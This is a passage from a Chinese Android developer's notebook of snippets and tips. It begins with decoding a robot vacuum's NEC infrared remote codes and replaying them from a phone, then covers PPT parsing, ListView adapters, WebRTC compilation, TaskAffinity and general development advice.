然而解码仪获得的用户码和数据码并不能直接写在代码中，因为液晶屏上的编码其实是十六进制数，需要转换为二进制数才行。例如用户码4055，对应的二进制数为0100 0000 0101 0101；数据码44，对应的二进制数为0100 0100，按位取反得到数据反码的二进制数为1011 1011。
可是前述的transmit方法，参数要传递整型数组形式的信号，并不是二进制数，这意味着二进制数还得转换成整型数组。那么整型数组里面存放的到底是些什么数据呢?这就要从数字电路中的电平说起了。电平是“电压平台”的简称，指的是电路中某一点电压的高低状态，在数字电路中常用高电平表示“1”，用低电平表示“0”。遥控器发射红外信号之时，通过“560微秒低电平+1680微秒高电平”代表“1”，通过“560微秒低电平+560微秒低电平”代表“0”。于是编写Android代码的时候，使用“560,1680”表示二进制的1，使用“560,560”表示二进制的0，此处的560和1680只是大概的数值，也可使用580、600替换560，或者使用1600、1650替换1680。
根据数字电路的电平规则，用户码4055对应的二进制数为0100 0000 0101 0101，转换成电平信号就变成了“560,560, 560,1680, 560,560, 560,560, 560,560, 560,560, 560,560, 560,560, 560,560, 560,1680, 560,560, 560,1680, 560,560, 560,1680, 560,560, 560,1680, ”，数据码44及其数据反码的电平信号依此类推。再加上NEC协议固定的引导码“9000,4500”，以及结束码“560,20000”，即可得出前面clean键的红外信号整型数组，具体的数组数值如下所示：
int[]  pattern = {9000,4500, // 开头两个数字表示引导码
    // 下面两行表示用户码
    560,560, 560,1680, 560,560, 560,560, 560,560, 560,560, 560,560, 560,560,
    560,560, 560,1680, 560,560, 560,1680, 560,560, 560,1680, 560,560, 560,1680,
    // 下面一行表示数据码
    560,560, 560,1680, 560,560, 560,560, 560,560, 560,1680, 560,560, 560,560,
    // 下面一行表示数据反码
    560,1680, 560,560, 560,1680, 560,1680, 560,1680, 560,560, 560,1680, 560,1680,
    560,20000}; // 末尾两个数字表示结束码
接着在App代码中代入上述的信号格式数组，即调用transmit方法传递格式参数，示例如下：
    // 普通家电的红外发射频率一般为38KHz
    cim.transmit(38000, pattern);
运行测试App，却发现不管让手机发送多少次的红外信号，扫地机器人都呆若木鸡，丝毫没有反应。这是咋回事?奥秘在于NEC协议只规定了大体上的编码规则，实际的遥控器信号在整体规则内略有调整。之前提到的解码仪，既是家电售后的检测仪器，也可作为App开发者的调试工具。拿起手机对准解码仪正面的接收窗口，点击按钮发送红外信号，解码仪同步显示分析后的信号数据，如下图所示：

由上图可知，此时手机发出的红外信号符合NEC6121协议，只不过用户码变成了02AA，数据码变成了22。把这两个码数翻译成二进制，则用户码02AA转为0000 0010 1010 1010，数据码22转为0010 0010。回头比较遥控器的解码数据，遥控器发出的用户码4055对应0100 0000 0101 0101，数据码44对应0100 0100。看起来手机与遥控器的信号区别，应当是每两个十六进制数先转为二进制数，然后倒过来排列，也就是所谓的逆序编码。
找到问题的症结便好办了，数学上有负负得正，编码则有逆逆得顺。既然4055逆序编码后变为02AA，那么02AA逆序编码后必为4055，于是再次构造用户码02AA以及数据码22的电平信号，更改后的红外信号数据如下所示：
int[]  pattern = {9000,4500, // 开头两个数字表示引导码
    // 下面两行表示用户码
    560,560, 560,560, 560,560, 560,560, 560,560, 560,560, 560,1680, 560,560,
    560,1680, 560,560, 560,1680, 560,560, 560,1680, 560,560, 560,1680, 560,560,
    // 下面一行表示数据码
    560,560, 560,560, 560,1680, 560,560, 560,560, 560,560, 560,1680, 560,560,
    // 下面一行表示数据反码
    560,1680, 560,1680, 560,560, 560,1680, 560,1680, 560,1680, 560,560, 560,1680,
    560,20000}; // 末尾两个数字表示结束码
重新编译运行测试App，手机依旧对准解码仪，然后点击按钮发射红外信号，解码仪终于正常显示用户码4055、数据码44了。这时再将手机对准扫地机器人，点击发射按钮，机器人居然转动起来了耶。至此遥控器clean键的红外编码正式破解完成，其它按键乃至其它家电遥控器的红外信号编码，均可通过解码仪破译得到。
当然，以上的红外信号解析办法，仅限于编码规则广泛公开的NEC协议。对于其它格式未知的电路协议，只能借助于更专业的单片机来分析，话说开发者拿起电路板，一边做电工，一边做码农，其乐也融融。采用红外遥控的家电种类与品牌都很繁多，前人已经对它们做了不少的信号破译工作，这些已知的红外信号数据详见网址http://www.remotecentral.com/cgi-bin/codes/，里面包括各大国外家电品牌的信号编码，有兴趣的读者可参考。
```

## [Snippet] 读取ppt

```text
public static ArrayList<String> readPPT(String path) {
    ArrayList<String> contentArray = new ArrayList<String>();
    try {
        FileInputStream fis = new FileInputStream(new File(path));
        HSLFSlideShow hslf = new HSLFSlideShow(fis);
        List<HSLFSlide> slides = hslf.getSlides();
        for (int i = 0; i < slides.size(); i++) {
            String content = "";
            HSLFSlide item = slides.get(i);
            // 读取一张幻灯片的内容(包括标题)
            List<List<HSLFTextParagraph>> tps = item.getTextParagraphs();
            for (int j = 0; j < tps.size(); j++) {
                List<HSLFTextParagraph> tps_row = tps.get(j);
                for (int k = 0; k < tps_row.size(); k++) {
                    HSLFTextParagraph tps_item = tps_row.get(k);
                    List<HSLFTextRun> trs = tps_item.getTextRuns();
                    for (int l = 0; l < trs.size(); l++) {
                        HSLFTextRun trs_item = trs.get(l);
                        content = String.format("%s%s\n", content, trs_item.getRawText());
                    }
                }
            }
            contentArray.add(content);
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    return contentArray;
}
```

## [图片] 如何获取彩色图像中的主色彩

```text
https://blog.csdn.net/jia20003/article/details/50414595
一：基本思路
对于一张RGB色彩空间的彩色图像，很多时间我们想通过程序获得该图像有几种主要的色彩，但是对一般图像来说，在色彩交界处都是通过像素混合来实现自然过渡，所以直接扫描图像的像素值，得到的不同颜色值可能多达上百中，而实际上图像可能只有3～4种的主要色彩，如何去掉那些混合颜色，准确提取出来这3～4中的主色彩，根据一般图像的特征，图像在不同色彩的边界处混合不同的颜色值，此可以视为图像的边缘特性之一，因此可以根据简单的边缘梯度算法实现这些混合像素的提取得到输出的像素值数组，然后扫描每个像素值，寻找指定半径参数R周围的像素，发现为零，而且距离中心像素最近的像素点的值做为中心像素的像素值，扫描结束以后输出像素数组，然后对数组线性扫描，即可得到图片的主要色彩RGB值。

二：实现步骤
1.      输入图像数组，对彩色图像灰度化
2.      对灰度化以后的图像，计算图像梯度，这里使用sobol算子
3.      对得到每一个非零像素点实现半径为R的范围内的扫描，找出与之最相近的为零的原像素值
4.      对得到数组进行简单的扫描，得到主色彩
其中参数R是要根据不同应用场景，找到最合适的值。理论上图像越大，R的取值也应该越大，否则算法会失准。
```

## XLIFF ，XML Localization Interchange File Format，XML本地化数据交换格式

```text
<resources xmlns:xliff="http://schemas.android.com/tools">
    <string name="hello">your name is <xliff:g id="NAME">%1$s</xliff:g>, and your age is<xliff:g id="AGE">%2$s</xliff:g></string>
    <string name="hello_simple">your name is %1$s, and your age is %2$s</string>
</resources>

两种，一种是直接使用%1$s类似的格式，另外一种就是使用 xliff:g 给需要替换的内容加了个名字而已，效果是相同的。
属性id可以随便命名
%n$ms：代表输出的是字符串，n代表是第几个参数，设置m的值可以在输出之前放置空格
%n$md：代表输出的是整数，n代表是第几个参数，设置m的值可以在输出之前放置空格，也可以设为0m,在输出之前放置m个0
%n$mf：代表输出的是浮点数，n代表是第几个参数，设置m的值可以控制小数位数，如m=2.2时，输出格式为00.00

textView.setText(getString(R.string.hello_simple, "android", "28"));
```

## [串口] Android串口通信

```text
https://blog.csdn.net/u013564742/article/details/79052574
```

## Android添加或删除文件不能实时更新问题

```text
在app上导出信息后，需要在电脑端把导出的信息拷到U盘，然后再拷到另一台机器上导入该信息，
但是发现在app导出信息后，android设备中能看到，电脑中却看不到。
原因：
android设备中信息的读取是读取文件数据库的，只有在开机或者其他状态变化（插拔SD卡）时才会扫描文件以更新该数据库，因此当添加或删除文件时（不处于需要刷新数据库的状态中），数据库中并没有该条信息。
解决方法：
使用广播通知数据库更新

代码如下所示：

intent.setAction("action_media_scanner_scan_file")
使用该动作通知系统更新
intent.setData(Uri.fromFile(new File(要更新的文件路径)));
sendBroadcast(intent);
注意： 这个只对文件有效，更新其文件夹无效，至于文件夹更新，据说也可以以此方法，但是我试过了，电脑显示的文件夹是以文件形式显示，不知道是设备原因还是什么，暂时还不知道原因，有知道的可以在下方留言告知。
```

## [Snippet] 用正则表达式判断字符串是否为数字

```text
public static boolean isNumber(String str){
    // 判断数字的正则表达式，当然也可以用作其他正则表达式
    String regex = "[0-9] *";
    Pattern pattern  = Pattern.compile(regex);
    return pattern.matcher(str).matches();
}
```

## Chrome浏览器设置搜索打开新的标签页

```text
每次用google搜索的时候,点击进去原来的搜索页面就不见了 ,其实可以设置打开新的标签页
1.登陆Chrome
2.登陆这个网址https://www.google.com/preferences
3.勾选 "在新的浏览器窗口中打开所选的每条搜索结果"
4.点击页面下方的保存
```

## [Snippet] adapter通用模板类

```text
import android.content.Context;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import java.util.List;

public abstract class CommenAdapter<T> extends BaseAdapter {
    protected LayoutInflater mInflater;
    protected Context mContext;
    protected List<T> mDatas;
    protected final int mItemLayoutId;

    public CommenAdapter(Context context, List<T> mDatas, int itemLayoutId) {
        this.mContext = context;
        this.mInflater = LayoutInflater.from(mContext);
        this.mDatas = mDatas;
        this.mItemLayoutId = itemLayoutId;
    }

    @Override
    public int getCount() {
        return mDatas.size();
    }

    @Override
    public T getItem(int position) {
        return mDatas.get(position);
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        final ViewHolder viewHolder = getViewHolder(position, convertView, parent);
        convert(viewHolder, getItem(position));
        return viewHolder.getConvertView();
    }

    public abstract void convert(ViewHolder helper, T item);

    private ViewHolder getViewHolder(int position, View convertView, ViewGroup parent) {
        return ViewHolder.get(mContext, convertView, parent, mItemLayoutId, position);
    }
}


import android.content.Context;
import android.graphics.Bitmap;
import android.util.SparseArray;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.TextView;

public class ViewHolder {
    private final SparseArray<View> mViews;
    private int mPosition;
    private View mConvertView;
    private ViewHolder(Context context, ViewGroup parent, int layoutId, int position) {
        this.mPosition = position;
        this.mViews = new SparseArray<View>();
        mConvertView = LayoutInflater.from(context).inflate(layoutId, parent, false);
        // setTag
        mConvertView.setTag(this);
    }

    /**
     * 拿到一个ViewHolder对象
     *
     * @param context
     * @param convertView
     * @param parent
     * @param layoutId
     * @param position
     * @return
     */
    public static ViewHolder get(Context context, View convertView, ViewGroup parent, int layoutId, int position) {
        if (convertView == null) {
            return new ViewHolder(context, parent, layoutId, position);
        }
        return (ViewHolder) convertView.getTag();
    }

    public View getConvertView(){
        return mConvertView;
    }

    /**
     * 通过控件的Id获取对于的控件，如果没有则加入views
     *
     * @param viewId
     * @return
     */
    public <T extends View> T getView(int viewId) {
        View view = mViews.get(viewId);
        if (view == null) {
            view = mConvertView.findViewById(viewId);
            mViews.put(viewId, view);
        }
        return (T) view;
    }

    /**
     * 为TextView设置字符串
     *
     * @param viewId
     * @param text
     * @return
     */
    public ViewHolder setText(int viewId, String text) {
        TextView view = getView(viewId);
        view.setText(text);
        return this;
    }

    /**
     * 为ImageView设置图片
     *
     * @param viewId
     * @param drawableId
     * @return
     */
    public ViewHolder setImageResource(int viewId, int drawableId) {
        ImageView view = getView(viewId);
        view.setImageResource(drawableId);
        return this;
    }

    /**
     * 为ImageView设置图片
     *
     * @param viewId
     * @param drawableId
     * @return
     */
    public ViewHolder setImageBitmap(int viewId, Bitmap bm) {
        ImageView view = getView(viewId);
        view.setImageBitmap(bm);
        return this;
    }

    public int getPosition() {
        return mPosition;
    }
}
```

## [Snippet] adapter通用模板类2

```text
import android.content.Context;
import android.support.annotation.LayoutRes;
import android.support.annotation.Nullable;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.BaseAdapter;
import android.widget.ListView;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public abstract class BaseArrayAdapter<D,Holder> extends BaseAdapter{
  private List<D> mInfos = new ArrayList<>();
  private final Object mLock = new Object();

  protected LayoutInflater mInflater;
  protected Context context;
  private boolean mNotifyOnChange = true;

  //传递context引用进来

  public BaseArrayAdapter(Context context) {
    mInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    this.context = context;
  }

  //mNotifyOnChange是一个控制的开关
  @Override
  public void notifyDataSetChanged() {
    super.notifyDataSetChanged();
    mNotifyOnChange = true;
  }
  public void setNotifyOnChange(boolean notifyOnChange) {
    mNotifyOnChange = notifyOnChange;
  }

  public Context getContext() {
    return context;
  }

  public int getCount() {
    return isEmpty() ? 0 : mInfos.size();
  }

  public D getItem(int position) {
    return isEmpty() ? null : mInfos.get(position);
  }

  public long getItemId(int position) {
    return position;
  }

  //覆写getView
  @Override public View getView(int position, View convertView, ViewGroup parent) {
    Holder holder;
    D d = getItem(position);
    if (convertView == null) {
      convertView = mInflater.inflate(getLayoutId(), parent, false);
      holder = onCreateViewHolder(convertView);
      convertView.setTag(holder);
    } else {
      holder = (Holder) convertView.getTag();
    }
    onBindViewHolder(holder, d, position, convertView);

    return convertView;
  }

  public abstract @LayoutRes int getLayoutId();

  /**
   * 创建Holder
   */
  public abstract Holder onCreateViewHolder(View convertView);

  /**
   * 绑定数据
   */
  public abstract void onBindViewHolder(Holder holder, D d, int position, View convertView);

  /**
   * 局部刷新的方法，如果不指明header个数，这里只考虑listView,其余按0处理
   *
   * @param parent AdapterView
   * @param position 需要刷新的position,这里的position不包含header
   */
  public void updateItem(AdapterView parent, int position) {
    int headerCount = 0;
    if (parent instanceof ListView) {
      headerCount = ((ListView) parent).getHeaderViewsCount();
    }
    updateItem(parent, position, headerCount);
  }
  /**
   * 局部刷新的方法
   *
   * @param parent AdapterView
   * @param position 需要刷新的position,这里的position不包含header
   * @param headerCount header个数
   */
  public void updateItem(AdapterView parent, int position, int headerCount) {
    int realPosition = position + headerCount;
    int firstVisiblePosition = parent.getFirstVisiblePosition();
    int lastVisiblePosition = parent.getLastVisiblePosition();
    // 判断position是否可见，如果可见调用updateUI方法
    if (realPosition >= firstVisiblePosition && realPosition <= lastVisiblePosition) {
      View view = parent.getChildAt(realPosition - firstVisiblePosition);
      onBindViewHolder((Holder) view.getTag(), getItem(position), position, null);
    }
  }

  /**
   * 这里忽略header
   * @param parent
   * @param position
   * @return
   */
  public Holder getItemHolder(AdapterView parent, int position){
    return (Holder) parent.getChildAt(position).getTag();
  }

  public void setDatas(@Nullable List<D> infos) {
    mInfos = infos;
    notifyDataSetChanged();
  }

  public List<D> getDatas() {
    return mInfos;
  }

  public boolean isEmpty() {
    return mInfos == null;
  }

  public void add(D t) {
    synchronized (mLock) {
      if (isEmpty()) {
        return;
      }
      mInfos.add(t);
    }
    if (mNotifyOnChange) notifyDataSetChanged();
  }

  public void addAll(List<D> list) {
    synchronized (mLock) {
      if (isEmpty()) {
        return;
      }
      if (list != null) {
        mInfos.addAll(list);
      }
    }
    if (mNotifyOnChange) notifyDataSetChanged();
  }

  public void clear() {
    if (isEmpty()) {
      return;
    }
    synchronized (mLock) {
      mInfos.clear();
    }
    if (mNotifyOnChange) notifyDataSetChanged();
  }
  public void remove(D t){
    synchronized (mLock){
      if(isEmpty()){
        return;
      }
      if(mInfos != null){
        mInfos.remove(t);
      }
    }
    if (mNotifyOnChange) notifyDataSetChanged();
  }
  public void insert(D t, int index){
    synchronized (mLock){
      if(isEmpty()){
        return;
      }
      if(mInfos != null){
        mInfos.add(index,t);
      }
    }
    if (mNotifyOnChange) notifyDataSetChanged();
  }

  public void sort(Comparator<? super D> comparator){
    synchronized (mLock){
      if(isEmpty()){
        return;
      }
      if(mInfos != null){
        Collections.sort(mInfos, comparator);
      }
    }
    if (mNotifyOnChange) notifyDataSetChanged();
  }
}
```

## [开源] Android webrtc 源码编译

```text
编译最近的代码
1 环境准备
ubuntu 16.04（最好是这个版本以上）
安装depot tools：
 国外:git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
 国内:git clone https://source.codeaurora.org/quic/lc/chromium/tools/depot_tools
 配置环境变量：export PATH=$PATH:/home/test/tools/depot_tools

2 下载代码
创建工作目录，然后运行以下命令

fetch --nohooks webrtc_android
gclient sync
这将获取Android特定部分的常规WebRTC checkout。 请注意，Android SDK和NDK等Android特定部分非常大（约8 GB），因此总大小约为16 GB。 同样的checkout可以用于Linux和Android开发，因为您可以为每个构建配置在不同的目录中生成Ninja项目文件。

编译Android，更新必要的依赖库。

./build/install-build-deps.sh
./build/install-build-deps-android.sh
编译代码

使用GN生成项目
进入src目录下，
gn gen out/Debug --args='target_os="android" target_cpu="arm"'
可以指定自己选择的目录而不是out/Debug ，以便并行管理多个配置。

To build for ARM64: use target_cpu=“arm64”
To build for 32-bit x86: use target_cpu=“x86”
To build for 64-bit x64: use target_cpu=“x64”
编译
ninja -C out/Debug （全部编译）
ninja -C out/Debug sdk/android:libjingle_peerconnection_so （单独编译某个模块）
ninja -C out/Debug AppRTCMobile
ninja -C out/Debug libwebrtc
下载release版本的代码
两种下载方式：
1 已下载原有的Android版本
可以在原有的.git/config中添加

fetch = +refs/branch-heads/*:refs/remotes/branch-heads/*
然后进行git fetch。
之后就可以切换分支了。

2 从最开始下载
创建一个工作目录，输入它，然后运行fetch webrtc

mkdir webrtc-checkout
cd webrtc-checkout
fetch --nohooks webrtc
gclient sync
下载成功后，到src目录下
要查看可用的发布分支，请运行：

git branch -r
要创建跟踪远程发布分支的本地分支（在此示例中为43分支）：

git checkout -b my_branch refs/remotes/branch-heads/43
gclient sync
注意：checkout时不会跟踪depot_tools，因此gclient sync可能会在足够旧的分支上中断。 在这种情况下，您可以尝试使用较旧的depot_tools：

which gclient
# cd to depot_tools dir
# edit update_depot_tools; add an exit command at the top of the file
git log  # find a hash close to the date when the branch happened
git checkout <hash>
cd ~/dev/webrtc/src
gclient sync
# When done, go back to depot_tools, git reset --hard, run gclient again and
# verify the current branch becomes REMOTE:origin/master
编译的方法和以上基本一致，太旧的代码不建议使用。
```

## [开源] Android Chrominum源码

```text
https://github.com/JackyAndroid/AndroidChromium
```

## [开源]  [log] Timber库(打log)

```text
https://github.com/JakeWharton/timber
```

## onRetainNonConfigurationInstance

```text
如何区别 onRetainNonConfigurationInstance 和 getLastNonConfigurationInstance?
很多网友可能知道Android横竖屏切换时会触发onSaveInstanceState，而还原时会产生onRestoreInstanceState，但是Android的Activity类还有一个方法名为onRetainNonConfigurationInstance和getLastNonConfigurationInstance这两个方法。
我们可以通过 onRetainNonConfigurationInstance 代替 onSaveInstanceState，比如距离2
@Override
public Object onRetainNonConfigurationInstance() {
    //这里需要保存的内容，在切换时不是bundle了，我们可以直接通过Object来代替
    return obj;
}

在恢复窗口时，我们可以不使用 onRestoreInstanceState，而代替的是 getLastNonConfigurationInstance 方法。我们可以直接在onCreate中使用，比如
Object obj = getLastNonConfigurationInstance();     最终obj的内容就是上次切换时的内容。
```

## [Snippet] 获取drawable的另一种方法

```text
String path = "com/drawable/resource/image.png"; 
InputStream is = getClassLoader().getResourceAsStream(path); 
Drawable.createFromStream(is, "src"); 
```

## [Snippet] 通过DexFile获取dex文件中的类名

```text
String path = context.getPackageManager().getApplicationInfo(context.getPackageName(), 0).sourceDir;  
DexFile dexfile = new DexFile(path);  
Enumeration<String> entries = dexfile.entries();  
while (entries.hasMoreElements()) {  
    String name = (String) entries.nextElement();  
}  
```

## [Snippet] 使用字体图标

```text
使用字体图标可以高度自定义图标的大小和颜色，对于个人开发者来说是一个特别好的消息，再也不用在找图标时考虑颜色和大小了。

material-design-iconic-font 字体下载地址
http://zavoloklom.github.io/material-design-iconic-font/

//在 Application 中加载字体
public class BaseApplication extends Application {
    private static BaseApplication instance;
    public static synchronized BaseApplication getInstance() {
        return instance;
    }
    //字体图标
    private Typeface iconTypeFace;
    public Typeface getIconTypeFace() {
        return iconTypeFace;
    }
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        iconTypeFace = Typeface.createFromAsset(getAssets(), "fonts/Material-Design-Iconic-Font.ttf");
    }
}

// 在 IconView 中使用字体
public class IconView extends TextView {
    public IconView(Context context) {
        super(context);
        init();
    }
    public IconView(Context context, AttributeSet attrs) {
        super(context, attrs);
        init();
    }
    public IconView(Context context, AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
        init();
    }
    private void init() {
        // 设置字体图标
        this.setTypeface(BaseApplication.getInstance().getIconTypeFace());
    }
}

// Material-Design-Iconic-Font.ttf 字体中的图标
<string name="icon_spniner">\uf3ec</string>
<string name="icon_flag">\uf162</string>
<string name="icon_home">\uf175</string>
```

## TaskAffinity

```text
一.通过配置方式来实现TaskAffinity来实现
上边说到要想使TaskAffinity属性生效，要与其它属性相配合。在配置文件中，需要设置activity的启动模式为singleTask或singleInstance才能生效(其实singleInstance本来就会在新Task中)

<activity android:name=".bActivity"
    android:launchMode="singleTask"
    android:taskAffinity="taskName"/>
二.通过动态的方式实现TaskAffinity属性
通过上述的配置，可以实现TaskAffinity属性。但是这样每次启动该Activity都会在TaskAffinity指定的栈中启动。有时候可能会希望该activity在特殊情况下才在TaskAffinity指定的栈中启动，大部分时候还是在原有的任务栈中启动，这个时候就需要动态方式来实现TaskAffinity属性。
在配置文件中，只制定TaskAffinity属性，而不制定launchMode的属性为singleTask。

<activity android:name=".bActivity"
    android:taskAffinity="taskName"/>
这样通过正常方式启动该Activity时，该Activity就会在原有任务栈中启动（启动该Activity的任务栈中）。若想在taskAffinity属性生效，需要在启动该Activity时设置Flag为FLAG_ACTIVITY_NEW_TASK。

Intent intent = new Intent(aAvtivity.this, bActivity.class);
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(intent);

当TaskAffinity生效时，如已经存在相应名称的任务栈，则不会新建栈，而是在该栈的栈顶建立相应activity；如果没有相应名称的任务栈，就会建立对应名称的新的任务栈。
```

## Android开发建议60条

```text
1.  全部Activity可继承自BaseActivity，便于统一风格与处理公共事件，构建对话框统一构建器的建立，万一需要整体变动，一处修改到处有效。
2.  数据库表段字段常量和SQL逻辑分离，更清晰，建议使用Lite系列框架LiteOrm库，超级清晰且重心可以放在业务上不用关心数据库细节。
3.  全局变量放全局类中，模块私有放自己的管理类中，让常量清晰且集中.
4.  不要相信庞大的管理类的东西会带来什么好处，可能是一场灾难，而要时刻注意单一职责原则，一个类专心做好一件事情更为清晰。
5.  如果数据没有必要加载，数据请务必延迟初始化，谨记为用户节省内存，总不会有坏处。
6.  异常抛出，在合适的位置处理或者集中处理，不要搞的到处是catch，混乱且性能低，尽量不要在循环体中捕获异常，以提升性能。
7.  地址引用链长时（3个以上指向）小心内存泄漏，和警惕堆栈地址指向，典型的易发事件是：数据更新了，ListView视图却没有刷新，这时Adapter很可能指向并的并不是你更新的数据容器地址（一般为List）。
8.  信息同步：不管是数据库还是网网络操作，新插入的数据注意返回ID（如果没有赋予唯一ID），否则相当于没有同步。
9.  多线程操作数据库时，db关闭了会报错，也很可能出现互锁的问题，推荐使用事务，推荐使用自动化的LiteOrm库操作。
10. 做之前先考虑那些可以公用，资源，layout，类，做一个结构、架构分析以加快开发，提升代码可复用度。
11. 有序队列操作add、delete操作时注意保持排序，否则你会比较难堪喔。
12. 数据库删除数据时，要注意级联操作避免出现永远删不掉的脏数据喔。
13. 关于形参实参：调用函数时参数为基本类型传的是值，即传值；参数为对象传递的是引用，即传址。
14. listview在数据未满一屏时，setSelection函数不起作用；ListView批量操作时各子项和视图正确对应，可见即所选。
15. 控制Activity的代码量，保持主要逻辑清晰。其他类遵守SRP（单一职能），ISP（接口隔离）原则。
16. arraylist执行remove时注意移除int和Integer的区别。你懂得。
17. Log请打上Tag，调试打印一定要做标记，能定位打印位置，否则尴尬是：不知道是哪里在打印。
18. 码块/常量/资源可以集中公用的一定共用，即使共用逻辑稍复杂一点也会值得，修改起来很轻松，修改一种，到处有效。
19. setSelection不起作用，尝试smoothScrollToPosition。ListView的LastVisiblePosition（最后一个可见子项）会随着getView方法执行位置不同变动而变。
20. 与Activity通讯使用Handler更方便； 如果你的框架回调链变长，考虑监听者模式简化回调。
21. 监听者模式不方便使用时，推荐EventBus框架库，使用时间总线，没接触过的同学可以自行脑补一下哦。
22. Handler在子线程线程使用Looper.prepare，或者new的时候给构造函数传入MainLooper来确保在主线程run。
23. timepicker 点击确定后需要clearFocus才能获取手动输入的时间。
24. 构造函数里面极度不推荐启动异步线程，会埋下隐患。比如：异步线程调用了本例的示例，就会悲剧等着崩溃吧。
25. 千万不要理所当然的以为一个对象不会为空，充分的做好容错处理；另外注意null也可以插入ArrayList等容器中。
26. ExpandableListView的子列表不能点击（禁用）要把Adapter的isChildSelectable方法返回true。
27. UI显示注意内容过长的情形要提前使用ScrollView否则在小手机上尴尬你懂得。
28. 注意按钮的感应范围不小于9mm否则不易点击；输入框注意光标的位置更易用户输入。
29. 服务器和客户端尽量统一唯一标识（有可能是ID），否则多少会有歧义和问题。
30. 注释，尽量去写足够的注释，去描述一下思路，达到看了可以明白某一块代码的效果。
31. 完整型数据一定要用Sqlite的Transaction，大数据一定要用。粗略测试插入100个数据有20倍的提速，插入1000个数据就有100多倍的提速。
32. 避免String=”null”的情况出现String = null,=””都可以。避免出现title=”无主题”这样的数据提交到数据库浪费空间。
33. 存在多个不同的dbhelper实例情况下，sqlitedatabase对象必然存在不同的实例，多线程同时写入数据，轮流写入数据时会不定时的报db is locked，引起崩溃，不管是操作同张表还是异表。读和写可以同时并发，轮流无规律的交替执行。同时写入数据时解决方案是用并发的每个线程都用事务，db则不会lock，按次整体写入。
34. 建议整个应用维护一个dbhelper实例，只要db没有关闭，全局就只有一个db实例，多线程并发写入db不会lock，严格交替进行写入：123123123。。。（123代表不同线程，轮流插入一个记录），读和写均不会锁住db，读写交替并没有规律，执行次数和程度看cpu分配给哪个线程的时间片长。
35. 一个任务使用事务嵌套N个事务，N个事务中有一个失败，这个任务整体失败，全部成功后，数据才写入，具有安全性，整体性。并且事务写入大批量数据的效率经实际测试成百上千倍的高于一般的单个写入。数据库大量数据、多线程操作建议使用LiteOrm数据库框架，更稳定简单。
36. 经常需要用ListView或者其它显示大量Items的控件实时跟踪或者查看信息，并且希望最新的条目可以自动滚动到可视范围内。通过设置的控件transcriptMode属性可以将Android平台的控件（支持ScrollBar）自动滑动到最底部。
37. Long a; 判断a有没有赋值，if(a == 0)在a没有赋值情况下会报错。应该if(a == null)，Integer、Floag等也一样，原因你懂，只是提醒你要小心喔。
38. 编码遇到读写、出入等逻辑要双向考虑，文件导入导出，字符字节相互转换都要两边转码。
39. 一个 int 值与一个 Integer 对象（能包含 int 值的最小对象）的大小比率约为 1:4（32位和64位机器有不同）。额外的开销源于 JVM 用于描述 Java 对象的元数据也就是 Integer，（Long、Double等也是）。
40. 对象由元数据和数据组成。元数据包括类（指向类的指针，描述了类的类型），标记（描述了对象状态，如散列码、形状等），锁（对象同步信息）。数组对象还包括大小的元数据。
41. 一个在 32 位 Java 运行时中使用 1GB Java 堆的 Java 应用程序在迁移到 64 位 Java 运行时之后，通常需要使用 1.7GB 的 Java 堆。
42. Hash 集合的访问性能比任何 List 的性能都要高，但每条目的成本也要更高。由于访问性能方面的原因，如果您正在创建大集合（例如，用于实现缓存），那么最好使用基于 Hash 的集合，而不必考虑额外的开销。
43. 对于并不那么注重访问性能的较小集合而言，List 则是合理的选择。ArrayList 和 LinkedList 集合的性能大体相同，但其内存占用完全不同：ArrayList 的每条目大小要比 LinkedList 小得多，但它不是准确设置大小的。List 要使用的正确实现是 ArrayList 还是 LinkedList 取决于 List 长度的可预测性。如果长度未知，那么正确的选择可能是 LinkedList，因为集合包含的空白空间更少。如果大小已知或可预知或比较小，那么 ArrayList 的内存开销会更低一些。
43. 选择正确的集合类型使你能够在集合性能与内存占用之间达到合理的平衡。除此之外，你可以通过正确调整集合大小来最大化填充率、最小化未得到利用的空间，从而最大限度地减少内存占用。
44. 充分利用封装（提供接口类来控制访问数据）和委托（helper对象来实施任务）两种理念。
45. 延迟分配 Hashtable：如果 Hashtable 为空是经常发生的普遍现象，那么仅在存在需要存储的数据时分配 Hashtable 应该是一种合理的做法。将 Hashtable 分配为准确的大小：虽然会有默认大小，但建议使用更为准确的初始大小。
46. EditText在setText时不要忘记是否需要setSelection。在大多数情况下是需要设置的。
47. XML两种情况要注意：1 属性名字时候有重复；2 注意文本是否包含非法字符，注意使用CDATA包裹。
48. 当逻辑没有明显问题时考虑对象属性、函数参数、网络传输参数是否全部了解，是否设置正确。
49. 当出现编译或者运行时错误，别人那没问题时，考虑你的编译环境和环境版本是否有问题。
50. 由于String类的immutable性质，当String变量需要经常变换其值时，应该考虑使用StringBuilder提升性能，多线程使用StringBuffer操作string提高程序效率。
51. java 栈的优势是比堆速度快，可共享，主要存放临时变量、参数等，堆的优势是可动态分配内存大小。
52. 只要是用new()来新建对象的，都会在堆中创建，而且其数据是单独存值的，即使与栈中的数据（值）相同，也不会与栈中的数据共享。
53. 基本数据类型定义的变量称自动变量，存的是‘字面值’，存在于栈中，可共享（存在即不新建）。
54. 多个RandomAccessFile对象指向同一个文件，可使用多个线程一起写入无需再自己加锁，经试验结论：三个线程分别写入100万次数据，使用锁约12秒，不使用约8.5秒。100个线程分别写入1万次数据使用锁耗时约4.2秒，不使用锁耗时约3秒。
55. XmlPullParser解析慎用nextText()方法，xml比较复杂，含有空标签、重复名字标签时容易出现异常问题；TEXT中使用getText()方法代替START_TAG中使用nextText()方法；START_TAG，TEXT，END_TAG三个事件配合使用。注意每个xml节点之间（不管是开始节点还是结束节点）都会出现TEXT事件。
56. 改变逻辑的时候考虑全部用到这项功能的地方，分散的地方多了，容易大意。
